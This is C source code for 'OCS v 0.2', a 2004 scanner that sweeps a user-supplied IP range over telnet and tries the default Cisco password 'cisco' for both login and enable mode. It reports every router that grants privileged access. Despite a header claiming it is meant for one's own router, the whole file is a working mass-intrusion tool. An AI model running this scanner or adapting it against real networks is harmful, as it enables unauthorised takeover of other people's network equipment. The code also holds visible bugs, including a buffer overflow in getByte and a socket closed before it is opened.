/*
   Author:  OverIP
   			Andrea Piscopiello
   			overip@gmail.com
   Source:  OCS v 0.2
   License: GPL
            This program is free software; you can redistribute it and/or
            modify it under the terms of the GNU General Public License
            as published by the Free Software Foundation; either version 2
            of the License, or (at your option) any later version.
   Email:   Write me for any problem or suggestion at: OverIP@gmail.com
   Date:    09/08/2004
   Read me: Just compile it with:

            gcc ocs.c -o ocs -lpthread

            Then run it with: ./OCS xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy
	    	xxx.xxx.xxx.xxx=range start IP
	    	yyy.yyy.yyy.yyy=range end IP

	    PAY ATTENTION: This source is coded for only personal use on
	    your own router Cisco. Don't hack around.

	    Special thanks to:
	    Khlero with your patience this code is out there :*
	    Shen139, without you I can't live :D
	    people that helped betatesting this code :)
	    Alex Kah (alex at question-defense dot com) from Question-Defense.com and his Cisco Router :)
	    I love U all :*
*/


#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>


int i=0;
int j=0;
int k=0;
int l=0;


char buffer_a[700];
char buffer_b[700];
char buffer_c[700];
char tmpIP[16];

pthread_t threadname;


void callScan()        // scanning
{
	scanna(tmpIP);
	pthread_exit(0);
}


static void funcAlarm()        //alarm
{
	pthread_exit(0);
}


int setnonblock(int sock)	//setta socket non bloccanti
{
	struct timeval timeout;

	timeout.tv_sec = 10;
	timeout.tv_usec = 0;
	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,(char*) &timeout, sizeof(timeout)))
	return 0;
	return 1;
}


void init(struct sockaddr_in *address,int port,int IP)
{
	address->sin_family=AF_INET;
	address->sin_port=htons((u_short)port);
	address->sin_addr.s_addr=IP;
}


int scanna(char*rangeIP)      //scanning
{
	int error;
	int sd;

	struct sockaddr_in server;

	close(sd);

	server.sin_family=AF_INET;
        server.sin_port=htons(23);
        server.sin_addr.s_addr=inet_addr(rangeIP);

	sd=socket(AF_INET,SOCK_STREAM,0);
	if(sd==-1)
	{
		printf("Socket Error(%s)\n",rangeIP);
		close(sd);
		pthread_exit(0);
	}

//	setnonblock(sd);
	signal(SIGALRM,funcAlarm);
	alarm(7);
	fflush(stdout);

 	error=connect(sd,(struct sockaddr*)&server,sizeof(server));
 	if(error==0)
	{
		printf("\n\n-%s\n",rangeIP);
		fflush(stdout);
		memset(buffer_c, '\0',700);
		recv(sd,buffer_c,700,0);
		printf("  |Logging... %s\n",rangeIP);
		fflush(stdout);
		memset(buffer_a, '\0',700);
		memset(buffer_b, '\0',700);

		send(sd,"cisco\r",6,0);

		sleep(1);

		recv(sd,buffer_a,700,0);

		if(strstr(buffer_a,"#"))
			printf("  |Default Enable Passwords found! Vulnerable Router IP: %s\n\n\n", rangeIP);
		else
		if(strstr(buffer_a,">"))
		{
			printf("  |Default Telnet password found. %s\n",rangeIP);
			fflush(stdout);
			send(sd,"enable\r",7,0);

			sleep(1);

			send(sd,"cisco\r",6,0);

			sleep(1);

			recv(sd,buffer_b,700,0);
			//printf("  Sto cercando di loggarmi in enable mode\n");
			//fflush(stdout);
		}
		if(strstr(buffer_b,"#"))
		printf("  |Default Telnet and Enable Passwords found! Vulnerable Router IP: %s\n\n\n", rangeIP);

		else

		printf("  |Router not vulnerable. \n");
		fflush(stdout);
	}
	else
	{
		printf("\n\n(%s) Filtered Ports\n",rangeIP);
		close(sd);
		alarm(0);
		signal(SIGALRM,NULL);
		pthread_exit(0);
	}

	close(sd);
	fflush(stdout);
	alarm(0);
	signal(SIGALRM,NULL);
	pthread_exit(0);
}


char *getByte(char *IP,int index);

int function1(char* IP, char* IP2)
{

	char rangeIP[16];

	pid_t pid;
	i=atoi(getByte(IP,1));
	j=atoi(getByte(IP,2));
	k=atoi(getByte(IP,3));
	l=atoi(getByte(IP,4));

	while(1)
	{

		sprintf(rangeIP,"%d.%d.%d.%d",i,j,k,l);
		strcpy(tmpIP,rangeIP);
 		if(pthread_create(&threadname, NULL,callScan,NULL)!=0)
		{
			printf("+    Thread error:\n");
			perror(" -    pthread_create() ");
			exit(0);
		}
		fflush(stdout);
		pthread_join(threadname, NULL);
		fflush(stdout);
		l++;
		if (l==256)
			{
				l=0;
				k++;
				if (k==256)
				{
					k=0;
					j++;
					if (j==256)
					{
						j=0;
						i++;
					}
				}
			}

		if(i==atoi(getByte(IP2,1)) && j==atoi(getByte(IP2,2)) && k==atoi(getByte(IP2,3)) && l==atoi(getByte(IP2,4)))
		{
			break;
		}

	}

		sprintf(rangeIP,"%d.%d.%d.%d",i,j,k,l);
		strcpy(tmpIP,rangeIP);
		fflush(stdout);
 		if(pthread_create(&threadname, NULL,callScan,NULL)!=0)
		{
			printf("+    Thread error:\n");
			perror(" -    pthread_create() ");
			exit(0);
		}
		pthread_join(threadname, NULL);

	fflush(stdout);
}


int main(int argc,char *argv[])
{

	int w;

 	printf("********************************* OCS v 0.2 **********************************\n");
 	printf("****                                                                      ****\n");
 	printf("****                           coded by OverIP                            ****\n");
 	printf("****                           overip@gmail.com                           ****\n");
 	printf("****                           under GPL License                          ****\n");
 	printf("****                                                                      ****\n");
 	printf("****             usage: ./ocs xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy             ****\n");
 	printf("****                                                                      ****\n");
 	printf("****                   xxx.xxx.xxx.xxx = range start IP                   ****\n");
 	printf("****                    yyy.yyy.yyy.yyy = range end IP                    ****\n");
 	printf("****                                                                      ****\n");
 	printf("******************************************************************************\n");

	if(argc!=3)

	{
		printf("use: %s IP IP\n",argv[0]);
		exit(-1);
	}

	for(w=1;w<=5;w++)
	if(atoi(getByte(argv[1],w))>255 || atoi(getByte(argv[2],w))>255)
	{
		printf("use: ./OCS IP IP\n");
		exit (-1);
	}


	for(w=1;w<=5;w++)
	if(atoi(getByte(argv[1],w))<atoi(getByte(argv[2],w)))
	{
		function1(argv[1],argv[2]);
		return 0;
	}

	else if(atoi(getByte(argv[1],w))>atoi(getByte(argv[2],w)))
	{
		printf("use: %s IP IP\n",argv[0]);
		return 0;
	}


	printf("Same IPs \n");
	fflush(stdout);
	scanna(argv[1]);
	return 0;
}


char *getByte(char *IP,int index)
{

	int i=0;
	int separator=0;
	static char byte[3];

	for(i=0;i<4;i++)
	byte[i]='\0';
	memset(byte,0,sizeof(byte));

	for(i=0;i<strlen(IP);i++)
	{

		if((IP[i]=='.') && (separator==index-1))

		{
			return byte;
		}

		else
		if(IP[i]=='.')

		{
		separator++;
		}

		else
		if (separator==index-1)

		{
			strncat(byte,&IP[i],1);
		}

	}

	return byte;
}

 
